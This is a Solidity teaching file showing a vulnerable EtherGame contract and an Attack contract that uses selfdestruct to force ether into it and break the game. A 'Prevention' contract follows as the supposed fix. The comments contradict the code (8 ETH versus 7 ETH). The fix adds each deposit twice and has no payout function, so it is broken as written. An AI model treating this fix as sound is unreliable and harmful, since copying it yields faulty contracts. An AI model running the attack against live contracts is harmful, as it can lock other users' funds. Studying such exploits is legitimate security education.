// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
/*
The purpose of this game is to show how self destruct function call can be used to forcefully
 send ether
to a smart contract without a fall back function
*/
//Write a code to hack a contract using self destruct.
contract EtherGame {
    /*
    EtherGame is a game where each user can deposit 1 ether, and the 7th person to deposit 1 ether wins all the ether stored 
    on the contract. 
    Once balance of the contract is equal to target Amount (7ETH), no more ether can be sent into the smart contract, 
    transactions will be reverted.
    */
    uint public targetAmount = 7 ether; //State Variable targetAmount holds target for the game (8ETH)
    address public winner; //State variable to hold the address of the winner i.e address of 8th person to deposit

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance; //holds the total amount of ether in the contract address
        require(balance <= targetAmount, "Game is over");

        /*if statement, saying that if balance of contract address is equal to target amount, then the winner 
        of this game is the address of the person calling the deposit function*/
        if (balance == targetAmount) { 
            winner = msg.sender;
        }
    }
    // function to claim Reward
    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
    // function to get balance of the contract address
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

}

contract Attack {

    EtherGame etherGame; //created a new state variable with reference to the contract he wants to attack(EtherGame)

    /*created a constructor which initialize etherGame to take in the address of the contract to be attacked
    This address is also taken in as input from the frontend.*/
    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        //The attacker can break the game by sending ether so that the game balance >= 8 ether

        address payable addr = payable(address(etherGame)); //created a local variable to hold the address of the contract,
        //made it payable to be able to receive money.

        selfdestruct(addr); //calls the self destruct function to force send ether to the EtherGame 
        //contract b4 destroying it it.
    }
}
//self destruct(address to send ether before destroying
/*
The best way to prevent this is to not use address(this.balance) to update the current balance of 
the contract and use a state state variable(balance) and update it when the user deposits funds.
*/

contract Prevention {
    uint public targetAmount = 7 ether;
    uint public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value ==1 ether, "You can only send 1 Ether");

        balance += msg.value;
        balance = balance + msg.value;
        //balance = 0 + 1
        //balance = 1+1
        
        require(balance <= targetAmount, "Game is over");

        if(balance ==targetAmount) {
            winner = msg.sender;
        }
    }
}